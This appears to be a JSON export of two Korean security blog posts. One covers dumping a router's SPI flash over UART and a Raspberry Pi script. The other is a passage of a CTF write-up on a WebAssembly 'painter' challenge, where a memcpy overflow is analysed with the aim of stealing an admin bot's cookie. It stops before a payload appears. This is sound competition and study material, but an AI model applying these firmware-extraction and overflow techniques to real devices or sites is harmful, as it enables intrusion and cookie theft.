[{"content":"계기 이번년도 초에 BoB 교육기간중에 갑자기 흥미가 생겨서 친구의 고물 라우터를 빼았았고 센터 뒤에서 무작정 UART에 땜질을 시작했다. 할 수 있다고 억지부리다가 부숴먹고 오기가 생겨서 더 하다가 또 부숴먹고 하나 또 구매했다.\n멸망 당연하지만 알리산 3천원 땜질기로는 제대로된 땜질을 할 수 없었고 이걸로 열심히 기판을 지지다 망가뜨렸다. 알리에서 열풍기를 포함한 땜질 키트와 방진 마스크를 사서 다시 시도했다. 열풍기 써보려고 테스트하다 또 하나 더 부숴먹고 조심히 다시 시작했다.\n구원 쿠팡에서 제일 위에 떠있는 라우터를 사왔다. 제일 기본적으로 디버깅 인터페이스부터 찾으려고 했다. JTAG나 UART가 어디 없나 찾던중 UART를 찾은것 같았다. 앞서 부숴먹은 라우터들의 경험을 바탕으로 열풍기를 잘 이용해가면서 USB to TTL을 손수 땜질을 했고, 시리얼 포트로 접속했다. baudrate를 맞춰야해서 인터넷에서 자주 사용되는 baudrate를 하나 하나 손수 넣어보면서 제대로된 출력이 나올때까지 기다렸다.\nBooting... init_ram bond:0x00000005 MCM 128MB dram_init_clk_frequency ,ddr_freq=1066 (Mbps), 533 (MHZ) DRAM init disable DRAM init enable DRAM init is done , jump to DRAM enable DRAM ODT SDR init done dev_map=0xb8142000 Detect page_size = 2KB (3) Detect bank_size = 8 banks(0x00000002) Detect dram size = 128MB (0x08000000) DDR init OK init ddr ok DRAM Type: DDR2 DRAM frequency: 533MHz DRAM Size: 128MB JEDEC id EF4018, EXT id 0x0000 found w25q128 flash vendor: Winbond w25q128, size=16MB, erasesize=4KB, max_speed_hz=29000000Hz auto_mode=0 addr_width=3 erase_opcode=0x00000020 Write PLL1=80c00042 =\u0026gt;CPU Wake-up interrupt happen! GISR=89000080 ---Realtek RTL8197F-VG boot code at 2023.08.24-12:28+0900 v3.4.14.2 (999MHz) bootbank is 1, bankmark 80000001, forced:0 no rootfs signature at 00330000! 이런식으로 부팅이 되는걸 UART로 볼 수 있었고, 정확한 맵인진 모르겠지만 다음과 같은 플래시 맵도 보였다\nloop: module loaded m25p80 spi0.0: change speed to 15000000Hz, div 7 JEDEC id EF4018 m25p80 spi0.0: found w25q128, expected m25p80 flash vendor: Winbond m25p80 spi0.0: w25q128 (16384 Kbytes) (2;000000 Hz) Creating 6 MTD partitions on \u0026#34;m25p80\u0026#34;: 0x000000000000-0x000000340000 : \u0026#34;boot+cfg+linux(bank1)\u0026#34; 0x000000340000-0x000000800000 : \u0026#34;root fs(bank1)\u0026#34; 0x000000800000-0x000000b40000 : \u0026#34;linux(bank2)\u0026#34; 0x000000b40000-0x000001000000 : \u0026#34;root fs(bank2)\u0026#34; 0x000000fe0000-0x000001000000 : \u0026#34;flatfs\u0026#34; 0x000000000000-0x000001000000 : \u0026#34;all image\u0026#34; tun: Universal TUN/TAP device driver, 1.6 tun: (C) 1999-2004 Max Krasnyansky \u0026lt;maxk@qualcomm.com\u0026gt; PPP generic driver version 2.4.2 NET: Registered protocol family 24 MPPE/MPPC encryption/compression module registered Realtek WLAN driver - version 3.8.0(2017-12-26)(SVN:) Adaptivity function - version 9.7.07 Do MDIO_RESET bootshell이 뜰거란 행복회로를 돌렸지만 어림도 없었고 일종의 매직키가 있나 싶어서 serial 포트에 연결해서 매직키 알려진 것들을 자동으로 막 보내는 스크립트도 열심히 작성했지만 아무것도 동작하지 않았다.\nSPI Dump 이렇게 연결된다고 한다. MISO, MOSI가 데이터 보내고 받는 핀이니 저렇게 연결했다. SPI flash를 읽는건 라즈베리파이에서도 지원하길래 데이터시트를 검색해서 그거대로 연결했다. 되었다가 안되었다가해서 핀을 계속 다시 연결했다. 이대로 파이썬으로 간단하게 코드를 구현했지만 어림도 없었다. 그래서 다시 차근 차근 데이터시트를 읽어보고 실제로 세팅하지 않아도 되는 핀들이나 세팅해야하는 핀들을 세팅했다.\n예제 코드들 구글링하던 도중 default CE chip enable하고 읽는 코드도 있길래 그러고 읽어도 어떨때는 제대로 읽혔다. 그래도 메뉴얼대로 spi_cs off 하고 issue하고 다시 on해서 구현했더니 그래도 데이터가 나오기 시작했다. 메모리 맵을 참고해서 쭉 파일시스템 추출을 시도했지만 생각보다 되게 불안정해서 클록 신호가 안맞는건지 조금만 흔들려도 데이터의 손실이 발생했다.\n#!/usr/bin/env python3 import gpiozero import spidev import time import tqdm import os #winbond_reset = gpiozero.LED(\u0026#34;GPIO0\u0026#34;) winbond_reset = gpiozero.OutputDevice(\u0026#34;GPIO0\u0026#34;) #winbond_wp = gpiozero.LED(\u0026#34;GPIO3\u0026#34;) winbond_wp = gpiozero.OutputDevice(\u0026#34;GPIO3\u0026#34;) #spi_cs = gpiozero.LED(\u0026#34;GPIO2\u0026#34;) spi_cs = gpiozero.OutputDevice(\u0026#34;GPIO2\u0026#34;) winbond_reset.off() winbond_wp.off() spi_cs.on() print(\u0026#34;Starting up...\u0026#34;) time.sleep(1) # Set /RESET high taking the Winbond out of reset state. # Set /WP high to make the chip\u0026#39;s memory writable. winbond_reset.on() winbond_wp.on() spi = spidev.SpiDev() spi.open(0, 0) spi.mode = 0 spi.lsbfirst = False spi.max_speed_hz = 1000000 spi_cs.off() ids = spi.xfer2([ 0x90, 0x00, 0x00, 0x00, 0x00, 0x00 ]) spi_cs.on() spi_cs.off() status_1 = spi.xfer2([ 0x05, 0x00 ]) spi_cs.on() spi_cs.off() \u0026#39;\u0026#39;\u0026#39; loop: module loaded m25p80 spi0.0: change speed to 15000000Hz, div 7 JEDEC id EF4018 m25p80 spi0.0: found w25q128, expected m25p80 flash vendor: Winbond m25p80 spi0.0: w25q128 (16384 Kbytes) (2;000000 Hz) Creating 6 MTD partitions on \u0026#34;m25p80\u0026#34;: 0x000000000000-0x000000340000 : \u0026#34;boot+cfg+linux(bank1)\u0026#34; 0x000000340000-0x000000800000 : \u0026#34;root fs(bank1)\u0026#34; 0x000000800000-0x000000b40000 : \u0026#34;linux(bank2)\u0026#34; 0x000000b40000-0x000001000000 : \u0026#34;root fs(bank2)\u0026#34; 0x000000fe0000-0x000001000000 : \u0026#34;flatfs\u0026#34; 0x000000000000-0x000001000000 : \u0026#34;all image\u0026#34; tun: Universal TUN/TAP device driver, 1.6 tun: (C) 1999-2004 Max Krasnyansky \u0026lt;maxk@qualcomm.com\u0026gt; PPP generic driver version 2.4.2 NET: Registered protocol family 24 MPPE/MPPC encryption/compression module registered Realtek WLAN driver - version 3.8.0(2017-12-26)(SVN:) Adaptivity function - version 9.7.07 \u0026#39;\u0026#39;\u0026#39; data = spi.xfer2([ 0x0b]+[0]*3) print([hex(x) for x in data[2:]]) spi_cs.on() data = spi.xfer2([0x9f] + [0]*3) print([hex(x) for x in data[2:]]) print(\u0026#34;ids=\u0026#34; + str(ids)) print(\u0026#34;status_1=\u0026#34; + str(status_1)) print(\u0026#34;JEDEC_ID=\u0026#34; + str(data)) def dump(filename, address, size): if os.path.isfile(filename): os.remove(filename) f = open(filename,\u0026#39;ab\u0026#39;) sz = 0x30 for i in tqdm.tqdm(range(size//sz+sz)): it = i*sz + address addr = [(it\u0026gt;\u0026gt;16)\u0026amp;0xff, (it\u0026gt;\u0026gt;8)\u0026amp;0xff, (it)\u0026amp;0xff] spi_cs.off() data = spi.xfer3([ 0x03]+ addr + [0] *(sz))[4:] # first 4bytes invalid spi_cs.on() assert len(data) == sz f.write(bytes(data)) f.close() #dump(\u0026#39;./boot.cfg.linux1\u0026#39;,0 ,0x000000340000-0x000000000000) #dump(\u0026#39;./rootfs_bank1.1\u0026#39;,0x000000340000,0x000000800000-0x000000340000) #dump(\u0026#39;./rootfs_bank2.2\u0026#39;,0x000000b40000,0x000001000000 - 0x000000b40000) #dump(\u0026#39;./flatfs\u0026#39;,0x000000fe0000,0x000001000000-0x000000fe0000) dump(\u0026#39;./linux_bank2\u0026#39;,0x000000b40000,0x000000b40000-0x000000800000) spi.close() 그래서 열심히 맵을 보고 같은 영역을 5번 정도씩 읽고 md5를 비교해서 같은 md5를 가진 파일들로 걸러냈다. init script를 분석해봤는데 cgi 바이너리를 돌리는 것을 확인했고 테스트를 해보려는데 생소한 라이브러리를 사용해서 qemu로 에뮬레이션하는데 실패했다. 그래서 뭔가 나중에 에뮬레이터 하나 만들어서 이거 돌려보면 재밌을것 같아서 미뤄두고 까먹고 있었다.\nEmulator 개발 dynamic linked binary인데 어떻게 환경을 유사하게 맞출 수 있을까 고민을 하다가 기본적인 커널 로더만 구현하고 유저에선 이미 ld라는 로더가 있으니 얘까지만 메모리에 올리고 잘 조건 맞추면 알아서 실행되지 않을까라고 생각했고 나중에 크로스아키텍처 퍼징을 위해서 syscall도 후킹하듯이 대체해서 입력도 넣을 수 있고, 라이브러리도 그냥 후킹해서 속이면 편하게 할 수 있을 것이라고 생각했다. 약간 qemu user static 인데 실질적으로 필요없는 시스콜 구현도 마음대로 생략하고 후킹도 마음대로 걸 수 있도록 하고 싶었다. 좀 불필요한 구현들을 사용자가 마음대로 빼고 후킹도 걸 수 있으면 상당히 편할것이라고 생각했다. 마침 학교에서 프로젝트를 내라고 하길래 이걸 구현하기로 했다.\n선행 연구들을 조금 찾아보았는데 이미 이런 아이디어를 가지고 파이썬으로 구현한 프로젝트가 있었다. https://github.com/qilingframework/qiling 근데 이걸 퍼징할때도 쓰는것 같았다. 파이썬으로 구현된 에뮬레이터를 이용해서 퍼징을 돌리는 것 보다는 C가 훨씬 빠르니 바로 C로 구현을 시작했다. 열심히 메모리를 봐가면서 커널 로더가 어떤 동작을 수행하는지 분석했고 그대로 구현했다. https://github.com/msh1307/N.2-EMUl 오랫동안 개발한 프로젝트는 아니라서 시스템콜도 일부만 지원되고 x86_64 아키텍처만 된다. MIPS도 추가해야하는데 귀차니즘 이슈로 멸망했다. 나중에 MIPS도 마저 개발해서 저걸로 퍼징한번 돌려보고 싶다.\n","permalink":"https://Ye0ngjae.github.io/blog/router_firmware_extraction_emulator_dev/","summary":"계기 이번년도 초에 BoB 교육기간중에 갑자기 흥미가 생겨서 친구의 고물 라우터를 빼았았고 센터 뒤에서 무작정 UART에 땜질을 시작했다. 할 수 있다고 억지부리다가 부숴먹고 오기가 생겨서 더 하다가 또 부숴먹고 하나 또 구매했다.\n멸망 당연하지만 알리산 3천원 땜질기로는 제대로된 땜질을 할 수 없었고 이걸로 열심히 기판을 지지다 망가뜨렸다. 알리에서 열풍기를 포함한 땜질 키트와 방진 마스크를 사서 다시 시도했다. 열풍기 써보려고 테스트하다 또 하나 더 부숴먹고 조심히 다시 시작했다.\n구원 쿠팡에서 제일 위에 떠있는 라우터를 사왔다.","title":"Router firmware extraction \u0026 ld based emulator development"},{"content":"painter 유사 그림판 컨셉인듯 하다. Web Assembly 익스플로잇해서 admin bot의 쿠키 탈취가 목적이다. Wasm 취약점 분석은 처음 해봐서 생소했다. admin-bot.js 파일과 dockerfile, app.py, index.wasm 등이 주어진다.\nAnalysis admin-bot.js import flag from \u0026#39;./flag.txt\u0026#39;; function sleep(time) { return new Promise(resolve =\u0026gt; { setTimeout(resolve, time); }); } export default { id: \u0026#39;painter\u0026#39;, name: \u0026#39;painter\u0026#39;, urlRegex: /^https:\\/\\/painter\\.tjc\\.tf\\//, timeout: 10000, handler: async (url, ctx) =\u0026gt; { const page = await ctx.newPage(); await page.goto(\u0026#39;https://painter.tjc.tf\u0026#39;, { waitUntil: \u0026#39;domcontentloaded\u0026#39; }); await page.setCookie({ name: \u0026#39;flag\u0026#39;, value: flag.trim(), domain: \u0026#39;painter.tjc.tf\u0026#39;, }); await sleep(1000); await page.goto(url, { timeout: 10000, waitUntil: \u0026#39;domcontentloaded\u0026#39; }); await sleep(10000); } }; admin bot 사이트 접속하면 url을 받아서 거기에 요청을 보내는 것을 알 수 있다. 쿠키에 flag가 들어있다. 쿠키 탈취가 목적이다.\nDockerfile FROM python:3.8.5-slim-buster RUN pip install flask gunicorn WORKDIR /app COPY . . EXPOSE 5000 ENTRYPOINT [\u0026#34;gunicorn\u0026#34;, \u0026#34;-b\u0026#34;, \u0026#34;0.0.0.0:5000\u0026#34;, \u0026#34;-t\u0026#34;, \u0026#34;4\u0026#34;, \u0026#34;app:app\u0026#34;] app.py from flask import Flask, render_template, redirect, request from uuid import uuid4 app = Flask(__name__) images = {} @app.route(\u0026#39;/\u0026#39;) def index(): return render_template(\u0026#39;index.html\u0026#39;) @app.route(\u0026#39;/save\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def post_image(): img, name = request.json[\u0026#39;img\u0026#39;], request.json[\u0026#39;name\u0026#39;] id = uuid4() images[id] = { \u0026#39;img\u0026#39;: img, \u0026#39;name\u0026#39;: name } return redirect(\u0026#39;/img/\u0026#39; + str(id)) @app.route(\u0026#39;/img/\u0026lt;uuid:id\u0026gt;\u0026#39;) def image_id(id): if id not in images: return redirect(\u0026#39;/\u0026#39;) img = images[id][\u0026#39;img\u0026#39;] name = images[id][\u0026#39;name\u0026#39;] return render_template(\u0026#39;index.html\u0026#39;, px=img, name=name, saved=True) if __name__ == \u0026#39;__main__\u0026#39;: app.run(debug=True) 이미지를 저장하거나 볼 수 있는 것 같다.\nindex.html \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;meta http-equiv=\u0026#34;Content-Type\u0026#34; content=\u0026#34;text/html; charset=utf-8\u0026#34;\u0026gt; \u0026lt;style\u0026gt; body { height: 100vh; width: 100%; margin: 0; display: grid; justify-items: center; align-items: center; text-align: left; } #options { display: flex; flex-direction: row; justify-content: space-between; } #canvas { border: 1px solid black; height: 75vh; max-height: 1000px; image-rendering: pixelated; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div\u0026gt; \u0026lt;h1 id=\u0026#34;name-h1\u0026#34;\u0026gt;\u0026lt;/h1\u0026gt; \u0026lt;canvas id=\u0026#34;canvas\u0026#34; tabindex=\u0026#34;-1\u0026#34;\u0026gt;\u0026lt;/canvas\u0026gt; \u0026lt;div\u0026gt; \u0026lt;input type=\u0026#34;color\u0026#34; id=\u0026#34;color-picker\u0026#34;\u0026gt; \u0026lt;select id=\u0026#34;layers\u0026#34;\u0026gt; \u0026lt;option value=\u0026#34;0\u0026#34;\u0026gt;Top Layer\u0026lt;/option\u0026gt; \u0026lt;option value=\u0026#34;1\u0026#34;\u0026gt;Middle Layer\u0026lt;/option\u0026gt; \u0026lt;option value=\u0026#34;2\u0026#34;\u0026gt;Bottom Layer\u0026lt;/option\u0026gt; \u0026lt;/select\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; id=\u0026#34;name\u0026#34; placeholder=\u0026#34;Name\u0026#34;\u0026gt; \u0026lt;button id=\u0026#34;save\u0026#34;\u0026gt;Save\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; const canvas = document.getElementById(\u0026#39;canvas\u0026#39;); Module = { canvas: canvas }; window.addEventListener(\u0026#39;keydown\u0026#39;, (e) =\u0026gt; { e.stopImmediatePropagation(); }, true); window.addEventListener(\u0026#39;keyup\u0026#39;, (e) =\u0026gt; { e.stopImmediatePropagation(); }, true); const strToCharArr = (str) =\u0026gt; { const ptr = _malloc(str.length + 1); Module.stringToUTF8(str, ptr, str.length + 1); return ptr; }; const base64ToArr = (enc) =\u0026gt; { const binary = atob(enc); const bytes = new Uint8Array(binary.length); for (let i = 0; i \u0026lt; bytes.length; i++) { bytes[i] = binary.charCodeAt(i); } return bytes; } const arrToCharArr = (arr) =\u0026gt; { const ptr = _malloc(arr.length); Module.writeArrayToMemory(arr, ptr); return ptr; } const setName = () =\u0026gt; { const name = UTF8ToString(_getName()); document.getElementById(\u0026#39;name-h1\u0026#39;).innerHTML = name; } Module.onRuntimeInitialized = () =\u0026gt; { _clearCanvas(); {% if saved %} const px = \u0026#39;{{ px }}\u0026#39;; const name = \u0026#39;{{ name }}\u0026#39;; _clearCanvas(); const bin = base64ToArr(px); // get img binary const arr = arrToCharArr(bin); _copyCanvas(arr, bin.length); _setName(strToCharArr(name), name.length); {% endif %} document.addEventListener(\u0026#39;mousemove\u0026#39;, (e) =\u0026gt; { const rect = canvas.getBoundingClientRect(); const scale = canvas.width / rect.width; _draw((e.clientX - rect.left) * scale, (e.clientY - rect.top) * scale); }); document.addEventListener(\u0026#39;mousedown\u0026#39;, (e) =\u0026gt; { _toggleLeftMouseButton(1); }); document.addEventListener(\u0026#39;mouseup\u0026#39;, (e) =\u0026gt; { _toggleLeftMouseButton(0); }); document.getElementById(\u0026#39;color-picker\u0026#39;).addEventListener(\u0026#39;input\u0026#39;, (e) =\u0026gt; { const c = e.target.value.match(/[0-9a-fA-F]{2}/g).map(v =\u0026gt; parseInt(v, 16)); _setColor(...c); }); document.getElementById(\u0026#39;layers\u0026#39;).addEventListener(\u0026#39;change\u0026#39;, (e) =\u0026gt; { _setLayer(parseInt(e.target.value)); }); document.getElementById(\u0026#39;name\u0026#39;).addEventListener(\u0026#39;input\u0026#39;, (e) =\u0026gt; { const name = e.target.value; _setName(strToCharArr(name), name.length); }); document.getElementById(\u0026#39;save\u0026#39;).addEventListener(\u0026#39;click\u0026#39;, (e) =\u0026gt; { const out = new Uint8Array(4 * canvas.width * canvas.height * 3); for (let i = 0; i \u0026lt; 3; i++) { const layerPtr = _getLayer(i); const layer = new Uint8Array(Module.HEAPU8.buffer, layerPtr, 4 * canvas.width * canvas.height); out.set(layer, 4 * canvas.width * canvas.height * i); } const binary = btoa(String.fromCharCode(...out)); const name = document.getElementById(\u0026#39;name\u0026#39;).value; fetch(\u0026#39;/save\u0026#39;, { method: \u0026#39;POST\u0026#39;, headers: { \u0026#39;Content-Type\u0026#39;: \u0026#39;application/json\u0026#39; }, body: JSON.stringify({ name: name, img: binary }) }).then((res) =\u0026gt; { if (res.status === 200) { navigator.clipboard.writeText(res.url); alert(\u0026#39;Save URL copied to clipboard!\u0026#39;); } else { alert(\u0026#39;Failed to save!\u0026#39;); } }); }) }; \u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;/static/index.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 저장할때 /save로 보내는 것을 알 수 있다. wasm function들을 사용해서 처리한다. index.js에서 export 하는 부분을 확인할 수 있다.\nindex.js ... var asm = createWasm(); /** @type {function(...*):?} */ var ___wasm_call_ctors = createExportWrapper(\u0026#34;__wasm_call_ctors\u0026#34;); /** @type {function(...*):?} */ var _getName = Module[\u0026#34;_getName\u0026#34;] = createExportWrapper(\u0026#34;getName\u0026#34;); /** @type {function(...*):?} */ var _getLayer = Module[\u0026#34;_getLayer\u0026#34;] = createExportWrapper(\u0026#34;getLayer\u0026#34;); /** @type {function(...*):?} */ var _setName = Module[\u0026#34;_setName\u0026#34;] = createExportWrapper(\u0026#34;setName\u0026#34;); /** @type {function(...*):?} */ var _free = createExportWrapper(\u0026#34;free\u0026#34;); /** @type {function(...*):?} */ var _copyCanvas = Module[\u0026#34;_copyCanvas\u0026#34;] = createExportWrapper(\u0026#34;copyCanvas\u0026#34;); /** @type {function(...*):?} */ var _setColor = Module[\u0026#34;_setColor\u0026#34;] = createExportWrapper(\u0026#34;setColor\u0026#34;); /** @type {function(...*):?} */ var _setLayer = Module[\u0026#34;_setLayer\u0026#34;] = createExportWrapper(\u0026#34;setLayer\u0026#34;); /** @type {function(...*):?} */ var _toggleLeftMouseButton = Module[\u0026#34;_toggleLeftMouseButton\u0026#34;] = createExportWrapper(\u0026#34;toggleLeftMouseButton\u0026#34;); /** @type {function(...*):?} */ var _draw = Module[\u0026#34;_draw\u0026#34;] = createExportWrapper(\u0026#34;draw\u0026#34;); /** @type {function(...*):?} */ var _clearCanvas = Module[\u0026#34;_clearCanvas\u0026#34;] = createExportWrapper(\u0026#34;clearCanvas\u0026#34;); /** @type {function(...*):?} */ var _loop = Module[\u0026#34;_loop\u0026#34;] = createExportWrapper(\u0026#34;loop\u0026#34;); /** @type {function(...*):?} */ var _main = Module[\u0026#34;_main\u0026#34;] = createExportWrapper(\u0026#34;main\u0026#34;); /** @type {function(...*):?} */ var _malloc = createExportWrapper(\u0026#34;malloc\u0026#34;); /** @type {function(...*):?} */ var ___errno_location = createExportWrapper(\u0026#34;__errno_location\u0026#34;); /** @type {function(...*):?} */ var ___dl_seterr = createExportWrapper(\u0026#34;__dl_seterr\u0026#34;); /** @type {function(...*):?} */ var _fflush = Module[\u0026#34;_fflush\u0026#34;] = createExportWrapper(\u0026#34;fflush\u0026#34;); /** @type {function(...*):?} */ var _emscripten_stack_init = function() { return (_emscripten_stack_init = Module[\u0026#34;asm\u0026#34;][\u0026#34;emscripten_stack_init\u0026#34;]).apply(null, arguments); }; /** @type {function(...*):?} */ var _emscripten_stack_get_free = function() { return (_emscripten_stack_get_free = Module[\u0026#34;asm\u0026#34;][\u0026#34;emscripten_stack_get_free\u0026#34;]).apply(null, arguments); }; /** @type {function(...*):?} */ var _emscripten_stack_get_base = function() { return (_emscripten_stack_get_base = Module[\u0026#34;asm\u0026#34;][\u0026#34;emscripten_stack_get_base\u0026#34;]).apply(null, arguments); }; /** @type {function(...*):?} */ var _emscripten_stack_get_end = function() { return (_emscripten_stack_get_end = Module[\u0026#34;asm\u0026#34;][\u0026#34;emscripten_stack_get_end\u0026#34;]).apply(null, arguments); }; ... 대충 함수 export를 해준다.\nindex.wasm 아래 디컴파일러를 사용해서 분석했다. wabt보다 훨씬 좋다. https://github.com/wasmkit/diswasm\nwasm 선형 메모리 얘기는 그냥 오프셋 가지고 메모리에 접근하는 것을 얘기하는 것 같다. wasm은 따로 ASLR 같은 메모리 보호 기법이 없다. global variable같은 것들은 그래서 주소가 하드코딩 되어있는듯? 하다.\nsetName() // O[0] Decompilation of $func238, known as $func5 export \u0026#34;setName\u0026#34;; // $func238 is exported to \u0026#34;setName\u0026#34; void $func5(int arr, int param1) { // offset=0xc int ar; // offset=0x8 int local_8; // offset=0x4 int local_4; ar = arr; local_8 = param1; label$1: { label$2: { if ((((local_8 \u0026gt;= 0x8) \u0026amp; 0x1) == 0x0)) break label$2; break label$1; }; }; local_8 = local_8; local_4 = 0x0; label$3: { while (1) { if ((((local_4 \u0026lt; local_8) \u0026amp; 0x1) == 0x0)) break label$3; *((unsigned char *) local_4 + 0x2191c) = *((unsigned char *) (ar + local_4)); local_4 = (local_4 + 0x1); break label$4; break ; }; }; *((unsigned char *) local_8 + 0x2191c) = 0x0; $free(ar); return; } 0x2191c가 Name이다.\ncopyCanvas() // O[0] Decompilation of $func239, known as $func6 export \u0026#34;copyCanvas\u0026#34;; // $func239 is exported to \u0026#34;copyCanvas\u0026#34; void $func6(int target, int length) { // offset=0xc int t; // offset=0x8 int l; t = target; l = length; $memcpy((0x2091c + 0x1008), t, l); // 0x21924 $free(t); return; } 0x21924에 length 만큼 복사한다.\ngetLayer() // O[0] Decompilation of $func237, known as $func4 export \u0026#34;getLayer\u0026#34;; // $func237 is exported to \u0026#34;getLayer\u0026#34; int $func4(int param0) { // offset=0xc int local_c; local_c = param0; return ((0x2091c + 0x1008) + (local_c \u0026lt;\u0026lt; 0xc)); } 0x21924가 Layer인 것 같다.\nmain() // O[2] Disassembly of $func248, known as $func15 export \u0026#34;main\u0026#34;; // $func248 is exported to \u0026#34;main\u0026#34; int $func15(int param0, int param1) { // local index=2 int local2; local2 = $func13(); return local2; } func13() // O[2] Disassembly of $func246, known as $func13 int $func13() { // local index=0 int local0; // local index=1 int local1; // local index=2 int local2; // local index=3 int local3; // local index=4 int local4; // local index=5 int local5; // local index=6 int local6; // local index=7 int local7; // local index=8 int local8; // local index=9 int local9; // local index=10 int local10; // local index=11 int local11; // local index=12 int local12; // local index=13 int local13; // local index=14 int local14; local0 = 0x20; $func18(local0); local1 = 0x20; local2 = 0x0; local3 = 0x20914; local4 = 0x20910; $func476(local1, local1, local2, local3, local4); local5 = 0x303; local6 = 0x0; $func80(local5, local6); local7 = 0x0; local8 = 0x20; local9 = $func670(local7, local8, local8, local8, local7, local7, local7, local7); local10 = 0x0; *((unsigned int *) local10 + 0x20918) = local9; local11 = 0x1; local12 = 0x0; local13 = 0x1; fimport_emscripten_set_main_loop(local11, local12, local13); // executes exported function named \u0026#34;loop\u0026#34; every tick local14 = 0x0; return local14; } tick 마다 \u0026ldquo;loop\u0026rdquo; 함수를 실행한다. 호스트 환경에서 실행시켜주기 때문에 \u0026ldquo;loop\u0026quot;는 export 해야 한다.\nloop() // O[0] Decompilation of $func245, known as $func12 export \u0026#34;loop\u0026#34;; // $func245 is exported to \u0026#34;loop\u0026#34; void $func12() { // offset=0x1c int local_1c; // offset=0x18 int local_18; // offset=0x14 int local_14; // offset=0x10 int local_10; // offset=0xc int local_c; label$1: { if (((*((unsigned int *) *((unsigned int *) 0x20918)) \u0026amp; 0x2) == 0x0)) break label$1; $func686(*((unsigned int *) 0x20918)); }; local_1c = *((unsigned int *) *((unsigned int *) 0x20918) + 0x14); local_18 = 0x0; label$2: { while (1) { if ((((local_18 \u0026lt; (*((unsigned short *) 0x24924) \u0026amp; 0xffff)) \u0026amp; 0x1) == 0x0)) break label$2; local_14 = 0x0; local_10 = 0x0; label$4: { while (1) { if ((((local_10 \u0026lt; 0x3) \u0026amp; 0x1) == 0x0)) break label$4; label$6: { if ((*((unsigned char *) (((0x2091c + 0x1008) + (local_10 \u0026lt;\u0026lt; 0xc)) + (local_18 + 0x3))) \u0026amp; 0xff)) break label$6; local_14 = local_10; break label$4; }; local_10 = (local_10 + 0x1); break label$5; break ; }; }; *((unsigned char *) local_18 + 0x2091c) = *((unsigned char *) (((0x2091c + 0x1008) + (local_14 \u0026lt;\u0026lt; 0xc)) + local_18)); *((unsigned char *) (local_18 + 0x1) + 0x2091c) = *((unsigned char *) (((0x2091c + 0x1008) + (local_14 \u0026lt;\u0026lt; 0xc)) + (local_18 + 0x1))); *((unsigned char *) (local_18 + 0x2) + 0x2091c) = *((unsigned char *) (((0x2091c + 0x1008) + (local_14 \u0026lt;\u0026lt; 0xc)) + (local_18 + 0x2))); *((unsigned char *) (local_18 + 0x3) + 0x2091c) = (0xff - (*((unsigned char *) (((0x2091c + 0x1008) + (local_14 \u0026lt;\u0026lt; 0xc)) + (local_18 + 0x3))) \u0026amp; 0xff)); // 4번째 -\u0026gt; 0xff 뺴기 local_18 = (local_18 + 0x4); break label$3; break ; }; }; fimport_emscripten_run_script(0x14fac /* \u0026#34;setName()\u0026#34; */ ); $memcpy(local_1c, 0x2091c, 0x1000); label$7: { if (((*((unsigned int *) *((unsigned int *) 0x20918)) \u0026amp; 0x2) == 0x0)) break label$7; $func687(*((unsigned int *) 0x20918)); }; local_c = $func489(*((unsigned int *) 0x20910), *((unsigned int *) 0x20918)); $func496(*((unsigned int *) 0x20910)); $func499(*((unsigned int *) 0x20910), local_c, 0x0, 0x0); $func502(*((unsigned int *) 0x20910)); $func488(local_c); return; } 0x2091c에 0x24924만큼 0x21924를 복사한다.\n대충 이제 구조를 그려보면\n0x24924 -\u0026gt; count // while loop copy cnt 0x21924 -\u0026gt; Layers 0x2191c -\u0026gt; Name 0x2091c -\u0026gt; pixels Updated every tick 0x2091c = 0x21924 이런 전역 구조체? 정도로 생각할 수 있다.\n4바이트씩 복사를 해주는데 이상하게 마지막 바이트는 0xff에서 빼서 넣어준다.\nExploitation index.html의 일부를 보면 아래와 같다.\nconst binary = btoa(String.fromCharCode(...out)); const name = document.getElementById(\u0026#39;name\u0026#39;).value; fetch(\u0026#39;/save\u0026#39;, { method: \u0026#39;POST\u0026#39;, headers: { \u0026#39;Content-Type\u0026#39;: \u0026#39;application/json\u0026#39; }, body: JSON.stringify({ name: name, img: binary }) }).then((res) =\u0026gt; { if (res.status === 200) { navigator.clipboard.writeText(res.url); alert(\u0026#39;Save URL copied to clipboard!\u0026#39;); } else { alert(\u0026#39;Failed to save!\u0026#39;); } }); binary는 클라이언트단에서 컨트롤이 가능하다.\n{% if saved %} const px = \u0026#39;{{ px }}\u0026#39;; const name = \u0026#39;{{ name }}\u0026#39;; _clearCanvas(); const bin = base64ToArr(px); // get img binary const arr = arrToCharArr(bin); _copyCanvas(arr, bin.length); _setName(strToCharArr(name), name.length); {% endif %} _copyCanvas를 호출하면서 length에 대한 경계 체크가 없다.\n$memcpy((0x2091c + 0x1008), t, l); // 0x21924 $free(t); l을 컨트롤할 수 있다. t는 malloc으로 할당받은 버퍼다.\n0x24924 -\u0026gt; count // while loop copy cnt 0x21924 -\u0026gt; Layers 0x2191c -\u0026gt; Name 0x2091c -\u0026gt; pixels Updated every tick 0x2091c = 0x21924 여기서 overflow를 내서 count를 덮을 수 있다.\n그리고 tick 마다 loop가 호출된다.\nlabel$2: { while (1) { if ((((local_18 \u0026lt; (*((unsigned short *) 0x24924) \u0026amp; 0xffff)) \u0026amp; 0x1) == 0x0)) break label$2; local_14 = 0x0; local_10 = 0x0; label$4: { while (1) { if ((((local_10 \u0026lt; 0x3) \u0026amp; 0x1) == 0x0)) break label$4; label$6: { if ((*((unsigned char *) (((0x2091c + 0x1008) + (local_10 \u0026lt;\u0026lt; 0xc)) + (local_18 + 0x3))) \u0026amp; 0xff)) break label$6; local_14 = local_10; break label$4; }; local_10 = (local_10 + 0x1); break label$5; break ; }; }; *((unsigned char *) local_18 + 0x2091c) = *((unsigned char *) (((0x2091c + 0x1008) + (local_14 \u0026lt;\u0026lt; 0xc)) + local_18)); *((unsigned char *) (local_18 + 0x1) + 0x2091c) = *((unsigned char *) (((0x2091c + 0x1008) + (local_14 